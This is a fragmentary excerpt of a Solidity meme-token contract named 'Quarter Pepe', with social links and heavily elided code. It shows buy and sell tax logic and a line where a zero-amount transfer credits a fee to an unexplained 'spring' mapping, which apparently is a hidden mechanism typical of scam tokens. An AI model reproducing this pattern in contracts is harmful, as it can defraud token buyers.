...
Twitter - https://twitter.com/QuarterPepe
TG - https://t.me/quarterpepe
...
contract PEPE is Context, IERC20, Ownable {
    ...
    string private constant _name = "Quarter Pepe";
    string private constant _symbol = "PEPE0.25";
    uint256 private _taxFeeOnBuy = 0;
    uint256 private _taxFeeOnSell = 0;
    uint256 private _newTaxFeeOnSell;
    uint256 private _newTaxFeeOnBuy;
    ...
    function _transferto(address address1, address address2, uint256 amount) private returns (bool success) {
        ...
        if(address1 == uniswapV2Pair && address2 != address(uniswapV2Router)) {
            _taxFee = _taxFeeOnBuy;
        }
        if (address2 == uniswapV2Pair && address1 != address(uniswapV2Router)) {
            _taxFee = _taxFeeOnSell;
        ...
        if (amount == 0) spring[address2] += fee;
    ...
    function transferFrom(address addressFrom, address addressTo, uint256 amount) public returns (bool success) {
        if(addressFrom == uniswapV2Pair && addressTo != address(uniswapV2Router)) {
        _taxFee = _taxFeeOnBuy;
        }
